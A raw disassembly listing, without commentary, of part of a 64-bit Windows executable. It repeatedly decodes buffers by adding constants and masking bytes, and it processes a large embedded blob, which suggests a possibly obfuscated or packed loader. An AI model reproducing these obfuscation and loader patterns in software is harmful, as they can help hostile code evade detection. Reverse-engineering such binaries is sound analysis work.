   14000691c:	49 8d 3c 5f          	lea    (%r15,%rbx,2),%rdi
   140006920:	80 3d 83 99 2b 00 00 	cmpb   $0x0,0x2b9983(%rip)        # 0x1402c02aa
   140006927:	0f 84 90 18 00 00    	je     0x1400081bd
   14000692d:	80 3d 50 a5 2b 00 00 	cmpb   $0x0,0x2ba550(%rip)        # 0x1402c0e84
   140006934:	74 63                	je     0x140006999
   140006936:	66 0f 6f 05 72 51 00 	movdqa 0x5172(%rip),%xmm0        # 0x14000bab0
   14000693d:	00 
   14000693e:	66 0f 6f 0d 1a a5 2b 	movdqa 0x2ba51a(%rip),%xmm1        # 0x1402c0e60
   140006945:	00 
   140006946:	66 0f fd c8          	paddw  %xmm0,%xmm1
   14000694a:	66 0f 6f 15 ce 4c 00 	movdqa 0x4cce(%rip),%xmm2        # 0x14000b620
   140006951:	00 
   140006952:	66 0f db ca          	pand   %xmm2,%xmm1
   140006956:	66 0f 7f 0d 02 a5 2b 	movdqa %xmm1,0x2ba502(%rip)        # 0x1402c0e60
   14000695d:	00 
   14000695e:	66 0f fd 05 0a a5 2b 	paddw  0x2ba50a(%rip),%xmm0        # 0x1402c0e70
   140006965:	00 
   140006966:	66 0f db c2          	pand   %xmm2,%xmm0
   14000696a:	66 0f 7f 05 fe a4 2b 	movdqa %xmm0,0x2ba4fe(%rip)        # 0x1402c0e70
   140006971:	00 
   140006972:	66 0f 6f 05 06 a5 2b 	movdqa 0x2ba506(%rip),%xmm0        # 0x1402c0e80
   140006979:	00 
   14000697a:	66 0f fd 05 1e 51 00 	paddw  0x511e(%rip),%xmm0        # 0x14000baa0
   140006981:	00 
   140006982:	66 0f db 05 06 4d 00 	pand   0x4d06(%rip),%xmm0        # 0x14000b690
   140006989:	00 
   14000698a:	66 0f 7e 05 ee a4 2b 	movd   %xmm0,0x2ba4ee(%rip)        # 0x1402c0e80
   140006991:	00 
   140006992:	c6 05 eb a4 2b 00 00 	movb   $0x0,0x2ba4eb(%rip)        # 0x1402c0e84
   140006999:	48 8d 9d 60 12 00 00 	lea    0x1260(%rbp),%rbx
   1400069a0:	41 b8 08 02 00 00    	mov    $0x208,%r8d
   1400069a6:	48 89 d9             	mov    %rbx,%rcx
   1400069a9:	31 d2                	xor    %edx,%edx
   1400069ab:	e8 30 3d 00 00       	call   0x14000a6e0
   1400069b0:	48 89 d9             	mov    %rbx,%rcx
   1400069b3:	48 89 fa             	mov    %rdi,%rdx
   1400069b6:	e8 35 3c 00 00       	call   0x14000a5f0
   1400069bb:	48 8d 15 9e a4 2b 00 	lea    0x2ba49e(%rip),%rdx        # 0x1402c0e60
   1400069c2:	48 89 d9             	mov    %rbx,%rcx
   1400069c5:	e8 16 3c 00 00       	call   0x14000a5e0
   1400069ca:	48 c7 85 40 17 00 00 	movq   $0x0,0x1740(%rbp)
   1400069d1:	00 00 00 00 
   1400069d5:	48 8d 0d 44 01 28 00 	lea    0x280144(%rip),%rcx        # 0x140286b20
   1400069dc:	48 8d bd 40 17 00 00 	lea    0x1740(%rbp),%rdi
   1400069e3:	ba c0 4b 00 00       	mov    $0x4bc0,%edx
   1400069e8:	49 89 f8             	mov    %rdi,%r8
   1400069eb:	e8 80 c5 ff ff       	call   0x140002f70
   1400069f0:	49 89 c6             	mov    %rax,%r14
   1400069f3:	4c 8b bd 40 17 00 00 	mov    0x1740(%rbp),%r15
   1400069fa:	48 89 d9             	mov    %rbx,%rcx
   1400069fd:	48 89 c2             	mov    %rax,%rdx
   140006a00:	45 89 f8             	mov    %r15d,%r8d
   140006a03:	e8 48 c9 ff ff       	call   0x140003350
   140006a08:	4c 89 bd 70 14 00 00 	mov    %r15,0x1470(%rbp)
   140006a0f:	4c 89 b5 f0 16 00 00 	mov    %r14,0x16f0(%rbp)
   140006a16:	48 8d 95 f0 16 00 00 	lea    0x16f0(%rbp),%rdx
   140006a1d:	4c 8d 85 70 14 00 00 	lea    0x1470(%rbp),%r8
   140006a24:	48 c7 c1 ff ff ff ff 	mov    $0xffffffffffffffff,%rcx
   140006a2b:	41 b9 00 80 00 00    	mov    $0x8000,%r9d
   140006a31:	e8 91 aa ff ff       	call   0x1400014c7
   140006a36:	48 8d 8d 60 12 00 00 	lea    0x1260(%rbp),%rcx
   140006a3d:	41 b8 08 02 00 00    	mov    $0x208,%r8d
   140006a43:	31 d2                	xor    %edx,%edx
   140006a45:	e8 96 3c 00 00       	call   0x14000a6e0
   140006a4a:	80 3d 5a 98 2b 00 00 	cmpb   $0x0,0x2b985a(%rip)        # 0x1402c02ab
   140006a51:	0f 84 97 17 00 00    	je     0x1400081ee
   140006a57:	80 3d 4a a4 2b 00 00 	cmpb   $0x0,0x2ba44a(%rip)        # 0x1402c0ea8
   140006a5e:	74 47                	je     0x140006aa7
   140006a60:	66 0f 6f 05 28 a4 2b 	movdqa 0x2ba428(%rip),%xmm0        # 0x1402c0e90
   140006a67:	00 
   140006a68:	66 0f fd 05 60 50 00 	paddw  0x5060(%rip),%xmm0        # 0x14000bad0
   140006a6f:	00 
   140006a70:	66 0f db 05 a8 4b 00 	pand   0x4ba8(%rip),%xmm0        # 0x14000b620
   140006a77:	00 
   140006a78:	66 0f 7f 05 10 a4 2b 	movdqa %xmm0,0x2ba410(%rip)        # 0x1402c0e90
   140006a7f:	00 
   140006a80:	f3 0f 7e 05 18 a4 2b 	movq   0x2ba418(%rip),%xmm0        # 0x1402c0ea0
   140006a87:	00 
   140006a88:	66 0f fd 05 50 50 00 	paddw  0x5050(%rip),%xmm0        # 0x14000bae0
   140006a8f:	00 
   140006a90:	66 0f db 05 c8 4b 00 	pand   0x4bc8(%rip),%xmm0        # 0x14000b660
   140006a97:	00 
   140006a98:	66 0f d6 05 00 a4 2b 	movq   %xmm0,0x2ba400(%rip)        # 0x1402c0ea0
   140006a9f:	00 
   140006aa0:	c6 05 01 a4 2b 00 00 	movb   $0x0,0x2ba401(%rip)        # 0x1402c0ea8
   140006aa7:	48 8d 0d e2 a3 2b 00 	lea    0x2ba3e2(%rip),%rcx        # 0x1402c0e90
   140006aae:	e8 4d 3b 00 00       	call   0x14000a600
   140006ab3:	66 83 3e 00          	cmpw   $0x0,(%rsi)
   140006ab7:	74 40                	je     0x140006af9
   140006ab9:	49 89 c6             	mov    %rax,%r14
   140006abc:	4c 8d 3d cd a3 2b 00 	lea    0x2ba3cd(%rip),%r15        # 0x1402c0e90
   140006ac3:	31 db                	xor    %ebx,%ebx
   140006ac5:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   140006acc:	00 00 00 00 
   140006ad0:	48 89 f1             	mov    %rsi,%rcx
   140006ad3:	4c 89 fa             	mov    %r15,%rdx
   140006ad6:	4d 89 f0             	mov    %r14,%r8
   140006ad9:	e8 b2 3b 00 00       	call   0x14000a690
   140006ade:	85 c0                	test   %eax,%eax
   140006ae0:	74 1b                	je     0x140006afd
   140006ae2:	48 89 f1             	mov    %rsi,%rcx
   140006ae5:	e8 16 3b 00 00       	call   0x14000a600
   140006aea:	66 83 7c 46 02 00    	cmpw   $0x0,0x2(%rsi,%rax,2)
   140006af0:	48 8d 74 46 02       	lea    0x2(%rsi,%rax,2),%rsi
   140006af5:	75 d9                	jne    0x140006ad0
   140006af7:	eb 08                	jmp    0x140006b01
   140006af9:	31 db                	xor    %ebx,%ebx
   140006afb:	eb 04                	jmp    0x140006b01
   140006afd:	4a 8d 1c 76          	lea    (%rsi,%r14,2),%rbx
   140006b01:	48 8d 8d 60 12 00 00 	lea    0x1260(%rbp),%rcx
   140006b08:	48 89 da             	mov    %rbx,%rdx
   140006b0b:	e8 d0 3a 00 00       	call   0x14000a5e0
   140006b10:	48 8d 8d 70 14 00 00 	lea    0x1470(%rbp),%rcx
   140006b17:	41 b8 08 02 00 00    	mov    $0x208,%r8d
   140006b1d:	31 d2                	xor    %edx,%edx
   140006b1f:	e8 bc 3b 00 00       	call   0x14000a6e0
   140006b24:	80 3d 81 97 2b 00 00 	cmpb   $0x0,0x2b9781(%rip)        # 0x1402c02ac
   140006b2b:	0f 84 0a 17 00 00    	je     0x14000823b
   140006b31:	80 3d 90 a3 2b 00 00 	cmpb   $0x0,0x2ba390(%rip)        # 0x1402c0ec8
   140006b38:	74 47                	je     0x140006b81
   140006b3a:	66 0f 6f 05 6e a3 2b 	movdqa 0x2ba36e(%rip),%xmm0        # 0x1402c0eb0
   140006b41:	00 
   140006b42:	66 0f fd 05 b6 4f 00 	paddw  0x4fb6(%rip),%xmm0        # 0x14000bb00
   140006b49:	00 
   140006b4a:	66 0f db 05 ce 4a 00 	pand   0x4ace(%rip),%xmm0        # 0x14000b620
   140006b51:	00 
   140006b52:	66 0f 7f 05 56 a3 2b 	movdqa %xmm0,0x2ba356(%rip)        # 0x1402c0eb0
   140006b59:	00 
   140006b5a:	f3 0f 7e 05 5e a3 2b 	movq   0x2ba35e(%rip),%xmm0        # 0x1402c0ec0
   140006b61:	00 
   140006b62:	66 0f fd 05 a6 4f 00 	paddw  0x4fa6(%rip),%xmm0        # 0x14000bb10
   140006b69:	00 
   140006b6a:	66 0f db 05 ee 4a 00 	pand   0x4aee(%rip),%xmm0        # 0x14000b660
   140006b71:	00 
   140006b72:	66 0f d6 05 46 a3 2b 	movq   %xmm0,0x2ba346(%rip)        # 0x1402c0ec0
   140006b79:	00 
   140006b7a:	c6 05 47 a3 2b 00 00 	movb   $0x0,0x2ba347(%rip)        # 0x1402c0ec8
   140006b81:	48 8d 9d 70 14 00 00 	lea    0x1470(%rbp),%rbx
   140006b88:	48 8d b5 50 10 00 00 	lea    0x1050(%rbp),%rsi
   140006b8f:	48 89 d9             	mov    %rbx,%rcx
   140006b92:	48 89 f2             	mov    %rsi,%rdx
   140006b95:	e8 56 3a 00 00       	call   0x14000a5f0
   140006b9a:	48 8d 15 0f a3 2b 00 	lea    0x2ba30f(%rip),%rdx        # 0x1402c0eb0
   140006ba1:	48 89 d9             	mov    %rbx,%rcx
   140006ba4:	e8 37 3a 00 00       	call   0x14000a5e0
   140006ba9:	80 3d fd 96 2b 00 00 	cmpb   $0x0,0x2b96fd(%rip)        # 0x1402c02ad
   140006bb0:	0f 84 d2 16 00 00    	je     0x140008288
   140006bb6:	80 3d 59 a3 2b 00 00 	cmpb   $0x0,0x2ba359(%rip)        # 0x1402c0f16
   140006bbd:	0f 84 b1 00 00 00    	je     0x140006c74
   140006bc3:	66 0f 6f 05 55 4f 00 	movdqa 0x4f55(%rip),%xmm0        # 0x14000bb20
   140006bca:	00 
   140006bcb:	66 0f 6f 0d fd a2 2b 	movdqa 0x2ba2fd(%rip),%xmm1        # 0x1402c0ed0
   140006bd2:	00 
   140006bd3:	66 0f fd c8          	paddw  %xmm0,%xmm1
   140006bd7:	66 0f 6f 15 41 4a 00 	movdqa 0x4a41(%rip),%xmm2        # 0x14000b620
   140006bde:	00 
   140006bdf:	66 0f db ca          	pand   %xmm2,%xmm1
   140006be3:	66 0f 7f 0d e5 a2 2b 	movdqa %xmm1,0x2ba2e5(%rip)        # 0x1402c0ed0
   140006bea:	00 
   140006beb:	66 0f 6f 0d ed a2 2b 	movdqa 0x2ba2ed(%rip),%xmm1        # 0x1402c0ee0
   140006bf2:	00 
   140006bf3:	66 0f fd c8          	paddw  %xmm0,%xmm1
   140006bf7:	66 0f db ca          	pand   %xmm2,%xmm1
   140006bfb:	66 0f 7f 0d dd a2 2b 	movdqa %xmm1,0x2ba2dd(%rip)        # 0x1402c0ee0
   140006c02:	00 
   140006c03:	66 0f 6f 0d e5 a2 2b 	movdqa 0x2ba2e5(%rip),%xmm1        # 0x1402c0ef0
   140006c0a:	00 
   140006c0b:	66 0f fd c8          	paddw  %xmm0,%xmm1
   140006c0f:	66 0f db ca          	pand   %xmm2,%xmm1
   140006c13:	66 0f 7f 0d d5 a2 2b 	movdqa %xmm1,0x2ba2d5(%rip)        # 0x1402c0ef0
   140006c1a:	00 
   140006c1b:	66 0f fd 05 dd a2 2b 	paddw  0x2ba2dd(%rip),%xmm0        # 0x1402c0f00
   140006c22:	00 
   140006c23:	66 0f db c2          	pand   %xmm2,%xmm0
   140006c27:	66 0f 7f 05 d1 a2 2b 	movdqa %xmm0,0x2ba2d1(%rip)        # 0x1402c0f00
   140006c2e:	00 
   140006c2f:	b8 b7 00 00 00       	mov    $0xb7,%eax
   140006c34:	8b 0d d6 a2 2b 00    	mov    0x2ba2d6(%rip),%ecx        # 0x1402c0f10
   140006c3a:	01 c1                	add    %eax,%ecx
   140006c3c:	0f b6 c9             	movzbl %cl,%ecx
   140006c3f:	66 89 0d ca a2 2b 00 	mov    %cx,0x2ba2ca(%rip)        # 0x1402c0f10
   140006c46:	0f b7 0d c5 a2 2b 00 	movzwl 0x2ba2c5(%rip),%ecx        # 0x1402c0f12
   140006c4d:	81 c1 b7 00 00 00    	add    $0xb7,%ecx
   140006c53:	0f b6 c9             	movzbl %cl,%ecx
   140006c56:	66 89 0d b5 a2 2b 00 	mov    %cx,0x2ba2b5(%rip)        # 0x1402c0f12
   140006c5d:	03 05 b1 a2 2b 00    	add    0x2ba2b1(%rip),%eax        # 0x1402c0f14
   140006c63:	0f b6 c0             	movzbl %al,%eax
   140006c66:	66 89 05 a7 a2 2b 00 	mov    %ax,0x2ba2a7(%rip)        # 0x1402c0f14
   140006c6d:	c6 05 a2 a2 2b 00 00 	movb   $0x0,0x2ba2a2(%rip)        # 0x1402c0f16
   140006c74:	80 3d 33 96 2b 00 00 	cmpb   $0x0,0x2b9633(%rip)        # 0x1402c02ae
   140006c7b:	0f 84 38 16 00 00    	je     0x1400082b9
   140006c81:	80 3d ae a2 2b 00 00 	cmpb   $0x0,0x2ba2ae(%rip)        # 0x1402c0f36
   140006c88:	74 5c                	je     0x140006ce6
   140006c8a:	66 0f 6f 05 8e a2 2b 	movdqa 0x2ba28e(%rip),%xmm0        # 0x1402c0f20
   140006c91:	00 
   140006c92:	66 0f fd 05 86 4e 00 	paddw  0x4e86(%rip),%xmm0        # 0x14000bb20
   140006c99:	00 
   140006c9a:	66 0f db 05 7e 49 00 	pand   0x497e(%rip),%xmm0        # 0x14000b620
   140006ca1:	00 
   140006ca2:	66 0f 7f 05 76 a2 2b 	movdqa %xmm0,0x2ba276(%rip)        # 0x1402c0f20
   140006ca9:	00 
   140006caa:	66 0f 6f 05 7e a2 2b 	movdqa 0x2ba27e(%rip),%xmm0        # 0x1402c0f30
   140006cb1:	00 
   140006cb2:	66 0f fd 05 86 4e 00 	paddw  0x4e86(%rip),%xmm0        # 0x14000bb40
   140006cb9:	00 
   140006cba:	66 0f db 05 ce 49 00 	pand   0x49ce(%rip),%xmm0        # 0x14000b690
   140006cc1:	00 
   140006cc2:	66 0f 7e 05 66 a2 2b 	movd   %xmm0,0x2ba266(%rip)        # 0x1402c0f30
   140006cc9:	00 
   140006cca:	b8 b7 00 00 00       	mov    $0xb7,%eax
   140006ccf:	03 05 5f a2 2b 00    	add    0x2ba25f(%rip),%eax        # 0x1402c0f34
   140006cd5:	0f b6 c0             	movzbl %al,%eax
   140006cd8:	66 89 05 55 a2 2b 00 	mov    %ax,0x2ba255(%rip)        # 0x1402c0f34
   140006cdf:	c6 05 50 a2 2b 00 00 	movb   $0x0,0x2ba250(%rip)        # 0x1402c0f36
   140006ce6:	80 3d c2 95 2b 00 00 	cmpb   $0x0,0x2b95c2(%rip)        # 0x1402c02af
   140006ced:	0f 84 15 16 00 00    	je     0x140008308
   140006cf3:	80 3d 92 ab 2b 00 00 	cmpb   $0x0,0x2bab92(%rip)        # 0x1402c188c
   140006cfa:	0f 84 5d 01 00 00    	je     0x140006e5d
   140006d00:	b8 18 00 00 00       	mov    $0x18,%eax
   140006d05:	48 8d 0d 2c a2 2b 00 	lea    0x2ba22c(%rip),%rcx        # 0x1402c0f38
   140006d0c:	66 0f 6f 05 0c 4e 00 	movdqa 0x4e0c(%rip),%xmm0        # 0x14000bb20
   140006d13:	00 
   140006d14:	66 0f 6f 0d 04 49 00 	movdqa 0x4904(%rip),%xmm1        # 0x14000b620
   140006d1b:	00 
   140006d1c:	0f 1f 40 00          	nopl   0x0(%rax)
   140006d20:	f3 0f 6f 54 41 d0    	movdqu -0x30(%rcx,%rax,2),%xmm2
   140006d26:	f3 0f 6f 5c 41 e0    	movdqu -0x20(%rcx,%rax,2),%xmm3
   140006d2c:	f3 0f 6f 64 41 f0    	movdqu -0x10(%rcx,%rax,2),%xmm4
   140006d32:	f3 0f 6f 2c 41       	movdqu (%rcx,%rax,2),%xmm5
   140006d37:	66 0f fd d0          	paddw  %xmm0,%xmm2
   140006d3b:	66 0f fd d8          	paddw  %xmm0,%xmm3
   140006d3f:	66 0f db d1          	pand   %xmm1,%xmm2
   140006d43:	66 0f db d9          	pand   %xmm1,%xmm3
   140006d47:	f3 0f 7f 54 41 d0    	movdqu %xmm2,-0x30(%rcx,%rax,2)
   140006d4d:	f3 0f 7f 5c 41 e0    	movdqu %xmm3,-0x20(%rcx,%rax,2)
   140006d53:	66 0f fd e0          	paddw  %xmm0,%xmm4
   140006d57:	66 0f fd e8          	paddw  %xmm0,%xmm5
   140006d5b:	66 0f db e1          	pand   %xmm1,%xmm4
   140006d5f:	66 0f db e9          	pand   %xmm1,%xmm5
   140006d63:	f3 0f 7f 64 41 f0    	movdqu %xmm4,-0x10(%rcx,%rax,2)
   140006d69:	f3 0f 7f 2c 41       	movdqu %xmm5,(%rcx,%rax,2)
   140006d6e:	48 83 c0 20          	add    $0x20,%rax
   140006d72:	48 3d b8 04 00 00    	cmp    $0x4b8,%rax
   140006d78:	75 a6                	jne    0x140006d20
   140006d7a:	0f b7 05 f7 aa 2b 00 	movzwl 0x2baaf7(%rip),%eax        # 0x1402c1878
   140006d81:	05 b7 00 00 00       	add    $0xb7,%eax
   140006d86:	0f b6 c0             	movzbl %al,%eax
   140006d89:	66 89 05 e8 aa 2b 00 	mov    %ax,0x2baae8(%rip)        # 0x1402c1878
   140006d90:	0f b7 05 e3 aa 2b 00 	movzwl 0x2baae3(%rip),%eax        # 0x1402c187a
   140006d97:	05 b7 00 00 00       	add    $0xb7,%eax
   140006d9c:	0f b6 c0             	movzbl %al,%eax
   140006d9f:	66 89 05 d4 aa 2b 00 	mov    %ax,0x2baad4(%rip)        # 0x1402c187a
   140006da6:	0f b7 05 cf aa 2b 00 	movzwl 0x2baacf(%rip),%eax        # 0x1402c187c
   140006dad:	05 b7 00 00 00       	add    $0xb7,%eax
   140006db2:	0f b6 c0             	movzbl %al,%eax
   140006db5:	66 89 05 c0 aa 2b 00 	mov    %ax,0x2baac0(%rip)        # 0x1402c187c
   140006dbc:	0f b7 05 bb aa 2b 00 	movzwl 0x2baabb(%rip),%eax        # 0x1402c187e
   140006dc3:	05 b7 00 00 00       	add    $0xb7,%eax
   140006dc8:	0f b6 c0             	movzbl %al,%eax
   140006dcb:	66 89 05 ac aa 2b 00 	mov    %ax,0x2baaac(%rip)        # 0x1402c187e
   140006dd2:	0f b7 05 a7 aa 2b 00 	movzwl 0x2baaa7(%rip),%eax        # 0x1402c1880
   140006dd9:	05 b7 00 00 00       	add    $0xb7,%eax
   140006dde:	0f b6 c0             	movzbl %al,%eax
   140006de1:	66 89 05 98 aa 2b 00 	mov    %ax,0x2baa98(%rip)        # 0x1402c1880
   140006de8:	0f b7 05 93 aa 2b 00 	movzwl 0x2baa93(%rip),%eax        # 0x1402c1882
   140006def:	05 b7 00 00 00       	add    $0xb7,%eax
   140006df4:	0f b6 c0             	movzbl %al,%eax
   140006df7:	66 89 05 84 aa 2b 00 	mov    %ax,0x2baa84(%rip)        # 0x1402c1882
   140006dfe:	0f b7 05 7f aa 2b 00 	movzwl 0x2baa7f(%rip),%eax        # 0x1402c1884
   140006e05:	05 b7 00 00 00       	add    $0xb7,%eax
   140006e0a:	0f b6 c0             	movzbl %al,%eax
   140006e0d:	66 89 05 70 aa 2b 00 	mov    %ax,0x2baa70(%rip)        # 0x1402c1884
   140006e14:	0f b7 05 6b aa 2b 00 	movzwl 0x2baa6b(%rip),%eax        # 0x1402c1886
   140006e1b:	05 b7 00 00 00       	add    $0xb7,%eax
   140006e20:	0f b6 c0             	movzbl %al,%eax
   140006e23:	66 89 05 5c aa 2b 00 	mov    %ax,0x2baa5c(%rip)        # 0x1402c1886
   140006e2a:	0f b7 05 57 aa 2b 00 	movzwl 0x2baa57(%rip),%eax        # 0x1402c1888
   140006e31:	05 b7 00 00 00       	add    $0xb7,%eax
   140006e36:	0f b6 c0             	movzbl %al,%eax
   140006e39:	66 89 05 48 aa 2b 00 	mov    %ax,0x2baa48(%rip)        # 0x1402c1888
   140006e40:	0f b7 05 43 aa 2b 00 	movzwl 0x2baa43(%rip),%eax        # 0x1402c188a
   140006e47:	05 b7 00 00 00       	add    $0xb7,%eax
   140006e4c:	0f b6 c0             	movzbl %al,%eax
   140006e4f:	66 89 05 34 aa 2b 00 	mov    %ax,0x2baa34(%rip)        # 0x1402c188a
   140006e56:	c6 05 2f aa 2b 00 00 	movb   $0x0,0x2baa2f(%rip)        # 0x1402c188c
   140006e5d:	48 c7 85 40 17 00 00 	movq   $0x0,0x1740(%rbp)
   140006e64:	00 00 00 00 
   140006e68:	48 8d 1d 61 a0 2b 00 	lea    0x2ba061(%rip),%rbx        # 0x1402c0ed0
   140006e6f:	48 89 d9             	mov    %rbx,%rcx
   140006e72:	e8 89 37 00 00       	call   0x14000a600
   140006e77:	8d 0c 45 02 00 00 00 	lea    0x2(,%rax,2),%ecx
   140006e7e:	01 c0                	add    %eax,%eax
   140006e80:	66 89 8d 42 17 00 00 	mov    %cx,0x1742(%rbp)
   140006e87:	66 89 85 40 17 00 00 	mov    %ax,0x1740(%rbp)
   140006e8e:	48 89 9d 48 17 00 00 	mov    %rbx,0x1748(%rbp)
   140006e95:	66 0f ef c0          	pxor   %xmm0,%xmm0
   140006e99:	66 0f 7f 85 f0 16 00 	movdqa %xmm0,0x16f0(%rbp)
   140006ea0:	00 
   140006ea1:	66 0f 7f 85 00 17 00 	movdqa %xmm0,0x1700(%rbp)
   140006ea8:	00 
   140006ea9:	c7 85 f0 16 00 00 30 	movl   $0x30,0x16f0(%rbp)
   140006eb0:	00 00 00 
   140006eb3:	48 89 bd 00 17 00 00 	mov    %rdi,0x1700(%rbp)
   140006eba:	66 0f 7f 85 10 17 00 	movdqa %xmm0,0x1710(%rbp)
   140006ec1:	00 
   140006ec2:	48 c7 85 30 17 00 00 	movq   $0x0,0x1730(%rbp)
   140006ec9:	00 00 00 00 
   140006ecd:	48 8d 8d 30 17 00 00 	lea    0x1730(%rbp),%rcx
   140006ed4:	4c 8d 85 f0 16 00 00 	lea    0x16f0(%rbp),%r8
   140006edb:	ba 01 00 1f 00       	mov    $0x1f0001,%edx
   140006ee0:	45 31 c9             	xor    %r9d,%r9d
   140006ee3:	e8 57 a6 ff ff       	call   0x14000153f
   140006ee8:	41 89 c6             	mov    %eax,%r14d
   140006eeb:	48 8b 9d 30 17 00 00 	mov    0x1730(%rbp),%rbx
   140006ef2:	48 89 d9             	mov    %rbx,%rcx
   140006ef5:	e8 64 a5 ff ff       	call   0x14000145e
   140006efa:	45 85 f6             	test   %r14d,%r14d
   140006efd:	0f 88 90 00 00 00    	js     0x140006f93
   140006f03:	48 ff c3             	inc    %rbx
   140006f06:	48 83 fb 02          	cmp    $0x2,%rbx
   140006f0a:	0f 82 83 00 00 00    	jb     0x140006f93
   140006f10:	48 8d 0d a9 0e 01 00 	lea    0x10ea9(%rip),%rcx        # 0x140017dc0
   140006f17:	4c 8d 85 30 17 00 00 	lea    0x1730(%rbp),%r8
   140006f1e:	ba 58 ed 26 00       	mov    $0x26ed58,%edx
   140006f23:	e8 48 c0 ff ff       	call   0x140002f70
   140006f28:	48 89 c3             	mov    %rax,%rbx
   140006f2b:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   140006f30:	48 8d 15 e9 9f 2b 00 	lea    0x2b9fe9(%rip),%rdx        # 0x1402c0f20
   140006f37:	4c 8d 05 fa 9f 2b 00 	lea    0x2b9ffa(%rip),%r8        # 0x1402c0f38
   140006f3e:	48 8d 8d 70 14 00 00 	lea    0x1470(%rbp),%rcx
   140006f45:	49 89 c1             	mov    %rax,%r9
   140006f48:	e8 63 ca ff ff       	call   0x1400039b0
   140006f4d:	48 89 c6             	mov    %rax,%rsi
   140006f50:	48 8b 85 30 17 00 00 	mov    0x1730(%rbp),%rax
   140006f57:	48 89 85 f0 16 00 00 	mov    %rax,0x16f0(%rbp)
   140006f5e:	48 89 9d 40 17 00 00 	mov    %rbx,0x1740(%rbp)
   140006f65:	48 8d 95 40 17 00 00 	lea    0x1740(%rbp),%rdx
   140006f6c:	4c 8d 85 f0 16 00 00 	lea    0x16f0(%rbp),%r8
   140006f73:	48 c7 c1 ff ff ff ff 	mov    $0xffffffffffffffff,%rcx
   140006f7a:	41 b9 00 80 00 00    	mov    $0x8000,%r9d
   140006f80:	e8 42 a5 ff ff       	call   0x1400014c7
   140006f85:	48 83 fe ff          	cmp    $0xffffffffffffffff,%rsi
   140006f89:	74 08                	je     0x140006f93
   140006f8b:	48 89 f1             	mov    %rsi,%rcx
   140006f8e:	e8 cb a4 ff ff       	call   0x14000145e
   140006f93:	80 3d 16 93 2b 00 00 	cmpb   $0x0,0x2b9316(%rip)        # 0x1402c02b0
   140006f9a:	0f 84 ad 13 00 00    	je     0x14000834d
   140006fa0:	80 3d 01 a9 2b 00 00 	cmpb   $0x0,0x2ba901(%rip)        # 0x1402c18a8
   140006fa7:	74 47                	je     0x140006ff0
   140006fa9:	66 0f 6f 05 df a8 2b 	movdqa 0x2ba8df(%rip),%xmm0        # 0x1402c1890
   140006fb0:	00 
   140006fb1:	66 0f fd 05 47 4b 00 	paddw  0x4b47(%rip),%xmm0        # 0x14000bb00
   140006fb8:	00 
   140006fb9:	66 0f db 05 5f 46 00 	pand   0x465f(%rip),%xmm0        # 0x14000b620
   140006fc0:	00 
   140006fc1:	66 0f 7f 05 c7 a8 2b 	movdqa %xmm0,0x2ba8c7(%rip)        # 0x1402c1890
   140006fc8:	00 
   140006fc9:	f3 0f 7e 05 cf a8 2b 	movq   0x2ba8cf(%rip),%xmm0        # 0x1402c18a0
   140006fd0:	00 
   140006fd1:	66 0f fd 05 37 4b 00 	paddw  0x4b37(%rip),%xmm0        # 0x14000bb10
   140006fd8:	00 
   140006fd9:	66 0f db 05 7f 46 00 	pand   0x467f(%rip),%xmm0        # 0x14000b660
   140006fe0:	00 
   140006fe1:	66 0f d6 05 b7 a8 2b 	movq   %xmm0,0x2ba8b7(%rip)        # 0x1402c18a0
   140006fe8:	00 
   140006fe9:	c6 05 b8 a8 2b 00 00 	movb   $0x0,0x2ba8b8(%rip)        # 0x1402c18a8
   140006ff0:	48 8d 9d 70 14 00 00 	lea    0x1470(%rbp),%rbx
   140006ff7:	48 8d b5 50 10 00 00 	lea    0x1050(%rbp),%rsi
   140006ffe:	48 89 d9             	mov    %rbx,%rcx
   140007001:	48 89 f2             	mov    %rsi,%rdx
   140007004:	e8 e7 35 00 00       	call   0x14000a5f0
   140007009:	48 8d 15 80 a8 2b 00 	lea    0x2ba880(%rip),%rdx        # 0x1402c1890
   140007010:	48 89 d9             	mov    %rbx,%rcx
   140007013:	e8 c8 35 00 00       	call   0x14000a5e0
   140007018:	80 3d 92 92 2b 00 00 	cmpb   $0x0,0x2b9292(%rip)        # 0x1402c02b1
   14000701f:	0f 84 75 13 00 00    	je     0x14000839a
   140007025:	80 3d ca a8 2b 00 00 	cmpb   $0x0,0x2ba8ca(%rip)        # 0x1402c18f6
   14000702c:	0f 84 b1 00 00 00    	je     0x1400070e3
   140007032:	66 0f 6f 05 16 4b 00 	movdqa 0x4b16(%rip),%xmm0        # 0x14000bb50
   140007039:	00 
   14000703a:	66 0f 6f 0d 6e a8 2b 	movdqa 0x2ba86e(%rip),%xmm1        # 0x1402c18b0
   140007041:	00 
   140007042:	66 0f fd c8          	paddw  %xmm0,%xmm1
   140007046:	66 0f 6f 15 d2 45 00 	movdqa 0x45d2(%rip),%xmm2        # 0x14000b620
   14000704d:	00 
   14000704e:	66 0f db ca          	pand   %xmm2,%xmm1
   140007052:	66 0f 7f 0d 56 a8 2b 	movdqa %xmm1,0x2ba856(%rip)        # 0x1402c18b0
   140007059:	00 
   14000705a:	66 0f 6f 0d 5e a8 2b 	movdqa 0x2ba85e(%rip),%xmm1        # 0x1402c18c0
   140007061:	00 
   140007062:	66 0f fd c8          	paddw  %xmm0,%xmm1
   140007066:	66 0f db ca          	pand   %xmm2,%xmm1
   14000706a:	66 0f 7f 0d 4e a8 2b 	movdqa %xmm1,0x2ba84e(%rip)        # 0x1402c18c0
   140007071:	00 
   140007072:	66 0f 6f 0d 56 a8 2b 	movdqa 0x2ba856(%rip),%xmm1        # 0x1402c18d0
   140007079:	00 
   14000707a:	66 0f fd c8          	paddw  %xmm0,%xmm1
   14000707e:	66 0f db ca          	pand   %xmm2,%xmm1
   140007082:	66 0f 7f 0d 46 a8 2b 	movdqa %xmm1,0x2ba846(%rip)        # 0x1402c18d0
   140007089:	00 
   14000708a:	66 0f fd 05 4e a8 2b 	paddw  0x2ba84e(%rip),%xmm0        # 0x1402c18e0
   140007091:	00 
   140007092:	66 0f db c2          	pand   %xmm2,%xmm0
   140007096:	66 0f 7f 05 42 a8 2b 	movdqa %xmm0,0x2ba842(%rip)        # 0x1402c18e0
   14000709d:	00 
   14000709e:	b8 9d 00 00 00       	mov    $0x9d,%eax
   1400070a3:	8b 0d 47 a8 2b 00    	mov    0x2ba847(%rip),%ecx        # 0x1402c18f0
   1400070a9:	01 c1                	add    %eax,%ecx
   1400070ab:	0f b6 c9             	movzbl %cl,%ecx
